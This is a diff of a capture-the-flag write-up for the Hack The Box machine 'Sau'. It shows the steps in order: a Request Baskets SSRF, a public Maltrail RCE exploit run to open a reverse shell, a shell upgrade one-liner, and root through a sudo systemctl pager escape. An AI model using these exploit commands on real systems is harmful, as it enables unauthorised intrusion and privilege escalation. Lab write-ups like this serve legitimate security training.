@@ -35,89 +35,89 @@ After joining the machine you can see the IP Address of the target machine.
 
 First I started by scanning for open ports on the target machine.
 
-![[Sau/assets/Untitled.png|Untitled.png]]
+![Untitled.png](Sau/assets/Untitled.png)
 
-![[Sau/assets/Untitled 1.png|Untitled 1.png]]
+![Untitled 1.png](Sau/assets/Untitled%201.png)
 
 From the response of the `nmap` , there are 3 open ports of which one is SSH running on port 22, on port 80 HTTP service is running, but its filtered by firewall and the other one is running on port `55555` , which is unknown, but returns a response for HTTP GET request.
 
 On visiting port 55555 on via browser, It returned a website.
 
-![[Sau/assets/Untitled 2.png|Untitled 2.png]]
+![Untitled 2.png](Sau/assets/Untitled%202.png)
 
 In the website is running the `request baskets` service version `1.2.1`. On searching about this service on google, found this: [https://www.exploit-db.com/exploits/51675](https://www.exploit-db.com/exploits/51675), which proves that the website is vulnerable to SSRF vulnerability. To exploit this vulnerability first create a new basket.
 
-![[Sau/assets/Untitled 3.png|Untitled 3.png]]
+![Untitled 3.png](Sau/assets/Untitled%203.png)
 
 Next make a note on the basket name and the access token and click on open basket.
 
-![[Sau/assets/Untitled 4.png|Untitled 4.png]]
+![Untitled 4.png](Sau/assets/Untitled%204.png)
 
 After opening the basket click on the settings icon on the top right corner.
 
-![[Sau/assets/Untitled 5.png|Untitled 5.png]]
+![Untitled 5.png](Sau/assets/Untitled%205.png)
 
 It open a configuration dialog box.
 
-![[Sau/assets/Untitled 6.png|Untitled 6.png]]
+![Untitled 6.png](Sau/assets/Untitled%206.png)
 
 On the configuration dialog box, fill the details as shown in the above figure and click apply. By configuring as mentioned above, we are trying to access the HTTP service running on port `80` which was blocked by the firewall on the target machine by leveraging the SSRF vulnerability.
 
 Basically what ever URL we configure on request basket, the request basket will send a GET request on its behalf and fetch the results for us, in our case it acts like a proxy to fetch the website, which is not accessible to use from the outside network, but is accessible to request basket application, since it is running on the same network on which the web service is running.
 
-![[Sau/assets/Untitled 7.png|Untitled 7.png]]
+![Untitled 7.png](Sau/assets/Untitled%207.png)
 
 Now open the link [ mentioned in the above picture, link might be different in your case ] in a new tab.
 
-![[Sau/assets/Untitled 8.png|Untitled 8.png]]
+![Untitled 8.png](Sau/assets/Untitled%208.png)
 
 We can see a website which is running `Maltrail v0.53`, nothing else is interesting on the website. So I started searching about `Maltrail v0.53`, and found this [https://www.exploit-db.com/exploits/51676](https://www.exploit-db.com/exploits/51676), from which we can device that the service is vulnerable to RCE.
 
 So I downloaded the payload [ [https://www.exploit-db.com/download/51676](https://www.exploit-db.com/download/51676) ] to give it a try.
 
-![[Sau/assets/Untitled 9.png|Untitled 9.png]]
+![Untitled 9.png](Sau/assets/Untitled%209.png)
 
 Before executing the payload, I started a `netcat` listener on port 8000.
 
-![[Sau/assets/Untitled 10.png|Untitled 10.png]]
+![Untitled 10.png](Sau/assets/Untitled%2010.png)
 
 Now its time to execute the payload.
 
 Command: `python3 51676 <HTB_VPN_TUN_IP> 8000 <the_request_basket_address_that_we_used_to_access_the_web_service>`
 
-![[Sau/assets/Untitled 11.png|Untitled 11.png]]
+![Untitled 11.png](Sau/assets/Untitled%2011.png)
 
 After executing the exploit, check the `netcat` listener.
 
-![[Sau/assets/Untitled 12.png|Untitled 12.png]]
+![Untitled 12.png](Sau/assets/Untitled%2012.png)
 
 We successfully got the connection back. Now we got our initial access to the target machine. First I upgraded the shell.
 
 Command: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
 
-![[Sau/assets/Untitled 13.png|Untitled 13.png]]
+![Untitled 13.png](Sau/assets/Untitled%2013.png)
 
 And also I found the user flag.
 
-![[Sau/assets/Untitled 14.png|Untitled 14.png]]
+![Untitled 14.png](Sau/assets/Untitled%2014.png)
 
 Now its time to escalate our privileges and find the root flag.
 
 I was looking out for some common privilege escalation vectors and found this.
 
-![[Sau/assets/Untitled 15.png|Untitled 15.png]]
+![Untitled 15.png](Sau/assets/Untitled%2015.png)
 
 The user `puma` can run the command `/usr/bin/systemctl status trail.service` as `sudo` without entering the password. I checked GTFObins regarding this and found this [https://gtfobins.github.io/gtfobins/systemctl/#sudo](https://gtfobins.github.io/gtfobins/systemctl/#sudo)
 
-![[Sau/assets/Untitled 16.png|Untitled 16.png]]
+![Untitled 16.png](Sau/assets/Untitled%2016.png)
 
 Thus if we run the command `sudo /usr/bin/systemctl status trail.service` , then run the command `!sh` after entering into the less page, we can escalate our privileges as root.
 
-![[Sau/assets/Untitled 17.png|Untitled 17.png]]
+![Untitled 17.png](Sau/assets/Untitled%2017.png)
 
 Now we have successfully escalated our privileges as root. Now its time to find the root flag.
 
-![[Sau/assets/Untitled 18.png|Untitled 18.png]]
+![Untitled 18.png](Sau/assets/Untitled%2018.png)
 
 We have successfully found the root flag.
 
